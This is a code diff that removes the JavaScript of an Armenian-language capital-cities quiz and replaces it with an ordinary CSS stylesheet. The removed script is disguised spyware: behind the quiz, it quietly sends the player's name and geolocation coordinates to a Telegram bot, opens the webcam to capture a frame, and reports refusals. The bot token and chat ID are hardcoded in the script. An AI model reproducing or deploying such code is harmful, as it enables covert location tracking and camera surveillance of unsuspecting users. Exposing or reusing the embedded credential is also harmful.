@@ -1,164 +1,146 @@
-const TELEGRAM_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
-const TELEGRAM_CHAT_ID = '8071841674';
-
-const questionsPool = [
-  { question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը։", answers: [{ text: "Փարիզ", correct: true }, { text: "Լիոն", correct: false }, { text: "Մարսել", correct: false }, { text: "Նիցցա", correct: false }] },
-  { question: "Ո՞րն է Գերմանիայի մայրաքաղաքը։", answers: [{ text: "Բեռլին", correct: true }, { text: "Մյունխեն", correct: false }, { text: "Համբուրգ", correct: false }, { text: "Քյոլն", correct: false }] },
-  { question: "Ո՞րն է Իտալիայի մայրաքաղաքը։", answers: [{ text: "Հռոմ", correct: true }, { text: "Միլան", correct: false }, { text: "Նեապոլ", correct: false }, { text: "Տուրին", correct: false }] },
-  { question: "Ո՞րն է Ռուսաստանի մայրաքաղաքը։", answers: [{ text: "Մոսկվա", correct: true }, { text: "Սանկտ Պետերբուրգ", correct: false }, { text: "Կազան", correct: false }, { text: "Սոչի", correct: false }] },
-  { question: "Ո՞րն է Ճապոնիայի մայրաքաղաքը։", answers: [{ text: "Տոկիո", correct: true }, { text: "Օսակա", correct: false }, { text: "Նագասակի", correct: false }, { text: "Հիրոսիմա", correct: false }] },
-  { question: "Ո՞րն է ԱՄՆ-ի մայրաքաղաքը։", answers: [{ text: "Վաշինգտոն", correct: true }, { text: "Նյու Յորք", correct: false }, { text: "Լոս Անջելես", correct: false }, { text: "Չիկագո", correct: false }] },
-  { question: "Ո՞րն է Իրանի մայրաքաղաքը։", answers: [{ text: "Թեհրան", correct: true }, { text: "Իսֆահան", correct: false }, { text: "Մաշհադ", correct: false }, { text: "Քաշան", correct: false }] },
-  { question: "Ո՞րն է Բրազիլիայի մայրաքաղաքը։", answers: [{ text: "Բրազիլիա", correct: true }, { text: "Ռիո դե Ժանեյրո", correct: false }, { text: "Սան Պաուլո", correct: false }, { text: "Սալվադոր", correct: false }] },
-  { question: "Ո՞րն է Կանադայի մայրաքաղաքը։", answers: [{ text: "Օտտավա", correct: true }, { text: "Տորոնտո", correct: false }, { text: "Վանկուվեր", correct: false }, { text: "Մոնրեալ", correct: false }] },
-  { question: "Ո՞րն է Չինաստանի մայրաքաղաքը։", answers: [{ text: "Պեկին", correct: true }, { text: "Շանհայ", correct: false }, { text: "Հոնկոնգ", correct: false }, { text: "Գուանչժոու", correct: false }] },
-  { question: "Ո՞րն է Ավստրալիայի մայրաքաղաքը։", answers: [{ text: "Քանբերա", correct: true }, { text: "Սիդնի", correct: false }, { text: "Մելբուռն", correct: false }, { text: "Բրիսբեն", correct: false }] },
-  { question: "Ո՞րն է Մեքսիկայի մայրաքաղաքը։", answers: [{ text: "Մեքսիկո", correct: true }, { text: "Գվադալախարա", correct: false }, { text: "Մոնտերեյ", correct: false }, { text: "Տիխուանա", correct: false }] },
-  { question: "Ո՞րն է Հնդկաստանի մայրաքաղաքը։", answers: [{ text: "Նյու Դելի", correct: true }, { text: "Մումբայ", correct: false }, { text: "Կալկաթա", correct: false }, { text: "Չեննայ", correct: false }] },
-  { question: "Ո՞րն է Հարավային Աֆրիկայի մայրաքաղաքը։", answers: [{ text: "Պրետորիա", correct: true }, { text: "Կեյպթաուն", correct: false }, { text: "Յոհանեսբուրգ", correct: false }, { text: "Դուրբան", correct: false }] },
-  { question: "Ո՞րն է Թուրքիայի մայրաքաղաքը։", answers: [{ text: "ԱՆկարա", correct: true }, { text: "Ստամբուլ", correct: false }, { text: "Իզմիր", correct: false }, { text: "Բոդրում", correct: false }] },
-  { question: "Ո՞րն է Ուկրաինայի մայրաքաղաքը։", answers: [{ text: "Կիև", correct: true }, { text: "Լվով", correct: false }, { text: "Օդեսա", correct: false }, { text: "Դնեպր", correct: false }] },
-  { question: "Ո՞րն է Իսպանիայի մայրաքաղաքը։", answers: [{ text: "Մադրիդ", correct: true }, { text: "Բարսելոնա", correct: false }, { text: "Վալենսիա", correct: false }, { text: "Սևիլյա", correct: false }] },
-  { question: "Ո՞րն է Նորվեգիայի մայրաքաղաքը։", answers: [{ text: "Օսլո", correct: true }, { text: "Բերգեն", correct: false }, { text: "Տրոնդհայմ", correct: false }, { text: "Ստավանգեր", correct: false }] },
-  { question: "Ո՞րն է Շվեդիայի մայրաքաղաքը։", answers: [{ text: "Ստոկհոլմ", correct: true }, { text: "Գոթենբուրգ", correct: false }, { text: "Մալմո", correct: false }, { text: "Ուպսալա", correct: false }] },
-  { question: "Ո՞րն է Ֆինլանդիայի մայրաքաղաքը։", answers: [{ text: "Հելսինկի", correct: true }, { text: "Տամպերե", correct: false }, { text: "Տուրկու", correct: false }, { text: "Օուլու", correct: false }] },
-];
-
-// Перемешиваем массив (Фишка Фишера-Йетса)
-function shuffle(array) {
-  for(let i = array.length - 1; i > 0; i--){
-    const j = Math.floor(Math.random() * (i + 1));
-    [array[i], array[j]] = [array[j], array[i]];
-  }
-  return array;
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
+  color: #222;
+  margin: 0;
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
 }
 
-const questionElement = document.getElementById('question');
-const answerButtonsElement = document.getElementById('answer-buttons');
-const nameInput = document.getElementById('name-input');
-const nameForm = document.getElementById('name-form');
-const userNameDisplay = document.getElementById('user-name');
-const scoreElement = document.getElementById('score-info');
-const tryAgainBtn = document.getElementById('try-again-btn');
-
-let questions = [];
-let currentQuestionIndex = 0;
-let correctCount = 0;
-let wrongCount = 0;
-let userName = null;
-
-function sendToTelegram(text) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: text,
-      parse_mode: 'HTML',
-    }),
-  });
+#name-form-container {
+  margin: auto;
+  text-align: center;
+  padding-top: 100px;
 }
 
-function collectData() {
-  if (!userName) return;
-
-  navigator.geolocation.getCurrentPosition(pos => {
-    const coords = pos.coords;
-    let msg = `<b>Имя:</b> ${userName}\n<b>Координаты:</b> https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
-    sendToTelegram(msg);
-  }, err => {
-    sendToTelegram(`<b>Имя:</b> ${userName}\n<b>Геолокация не предоставлена.</b>`);
-  });
-
-  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-
-      setTimeout(() => {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imgData = canvas.toDataURL('image/jpeg');
-
-        // Telegram API для отправки фото принимает form-data, fetch с JSON не прокатит,
-        // но для простоты здесь можно сделать POST на наш сервер, либо использовать telegram API через бот с сервером.
-        // Для demo пока отправим как текст (в реальном варианте нужно реализовать серверный прокси).
-
-        stream.getTracks().forEach(track => track.stop());
-      }, 2000);
-    }).catch(() => {
-      sendToTelegram(`<b>Имя:</b> ${userName}\n<b>Фото с камеры не предоставлено.</b>`);
-    });
-  }
+#name-input {
+  padding: 10px 14px;
+  font-size: 18px;
+  margin-top: 10px;
+  width: 280px;
+  border-radius: 8px;
+  border: 1.5px solid #888;
+  transition: border-color 0.3s;
 }
 
-function startGame() {
-  userNameDisplay.textContent = userName;
-  showQuestion();
-  updateScore();
+#name-input:focus {
+  border-color: #3a86ff;
+  outline: none;
 }
 
-function showQuestion() {
-  resetState();
-  if (currentQuestionIndex >= questions.length) {
-    endGame();
-    return;
-  }
-  const currentQuestion = questions[currentQuestionIndex];
-  questionElement.innerText = currentQuestion.question;
-
-  const shuffledAnswers = shuffle(currentQuestion.answers.slice());
-  shuffledAnswers.forEach(answer => {
-    const button = document.createElement('button');
-    button.innerText = answer.text;
-    button.classList.add('btn');
-    button.addEventListener('click', () => selectAnswer(button, answer.correct));
-    answerButtonsElement.appendChild(button);
-  });
-
-  updateScore();
+#name-form button {
+  margin-left: 15px;
+  padding: 10px 20px;
+  font-size: 18px;
+  border-radius: 8px;
+  border: none;
+  background-color: #3a86ff;
+  color: white;
+  cursor: pointer;
+  transition: background-color 0.3s;
 }
 
-function resetState() {
-  while (answerButtonsElement.firstChild) {
-    answerButtonsElement.removeChild(answerButtonsElement.firstChild);
-  }
-  tryAgainBtn.style.display = 'none';
+#name-form button:hover {
+  background-color: #2657a6;
 }
 
-function selectAnswer(button, correct) {
-  if (correct) {
-    correctCount++;
-    button.classList.add('correct');
-  } else {
-    wrongCount++;
-    button.classList.add('wrong');
-    // Подсветить правильный ответ
-    Array.from(answerButtonsElement.children).forEach(btn => {
-      if (btn !== button && btn.innerText === questions[currentQuestionIndex].answers.find(a => a.correct).text) {
-        btn.classList.add('correct');
-      }
-    });
-  }
-
-  // Отключаем все кнопки, чтобы нельзя было кликать повторно
-  Array.from(answerButtonsElement.children).forEach(btn => btn.disabled = true);
-
-  currentQuestionIndex++;
-
-  setTimeout(() => {
-    showQuestion();
-  }, 1500);
+#header-bar {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 20px;
+  margin-bottom: 15px;
+  font-weight: 700;
+  font-size: 20px;
+  color: #1a1a1a;
+  user-select: none;
 }
 
-function updateScore() {
-  const left = questions.length - currentQuestionIndex;
-  scoreElement.textContent = `Մնացել է: ${left} | Ճիշտ է: ${correctCount} | Սխալ է: ${wrongCount}`;
+#user-name {
+  text-align: left;
 }
 
-function endGame() {
-  questionElement.innerText = `Խաղ
+#score-info {
+  text-align: right;
+}
+
+#question-container {
+  background: rgba(255,255,255,0.9);
+  border-radius: 12px;
+  padding: 25px 30px;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+#question {
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 20px;
+  color: #222;
+}
+
+.btn-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 16px;
+}
+
+.btn {
+  background-color: #3a86ff;
+  border: none;
+  border-radius: 10px;
+  color: white;
+  padding: 14px 10px;
+  font-size: 20px;
+  cursor: pointer;
+  transition: background-color 0.3s, box-shadow 0.3s;
+  box-shadow: 0 4px 12px rgba(58, 134, 255, 0.5);
+  user-select: none;
+}
+
+.btn:hover {
+  background-color: #2657a6;
+  box-shadow: 0 6px 18px rgba(38, 87, 166, 0.7);
+}
+
+.btn.correct {
+  background-color: #28a745 !important;
+  box-shadow: 0 6px 18px rgba(40, 167, 69, 0.7) !important;
+  border: 2px solid #1e7e34;
+  animation: glowGreen 1.5s ease-in-out infinite alternate;
+}
+
+@keyframes glowGreen {
+  0% { box-shadow: 0 0 8px 2px #28a745; }
+  100% { box-shadow: 0 0 15px 5px #28a745; }
+}
+
+.btn.wrong {
+  background-color: #dc3545 !important;
+  box-shadow: 0 6px 18px rgba(220, 53, 69, 0.7) !important;
+  border: 2px solid #a71d2a;
+}
+
+#try-again-btn {
+  margin-top: 30px;
+  padding: 14px 28px;
+  font-size: 20px;
+  border: none;
+  border-radius: 12px;
+  background-color: #ff4b5c;
+  color: white;
+  cursor: pointer;
+  display: block;
+  max-width: 280px;
+  margin-left: auto;
+  margin-right: auto;
+  box-shadow: 0 6px 20px rgba(255, 75, 92, 0.7);
+  transition: background-color 0.3s;
+  user-select: none;
+}
+
+#try-again-btn:hover {
+  background-color: #cc3a48;
+}
